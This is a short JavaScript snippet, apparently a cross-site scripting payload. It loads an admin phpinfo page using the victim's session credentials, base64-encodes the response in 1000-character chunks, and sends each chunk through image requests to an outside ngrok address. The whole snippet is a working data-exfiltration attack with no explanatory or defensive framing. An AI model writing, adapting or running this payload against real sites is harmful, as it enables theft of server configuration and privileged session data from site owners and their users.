fetch('/admin/phpinfo.php',{credentials:'include'})
.then(r=>r.text())
.then(d=>{
  for(let i=0;i<d.length;i+=1000){
    new Image().src="https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app?step="+i+"&data="+encodeURIComponent(btoa(d.slice(i,i+1000)));
  }
});
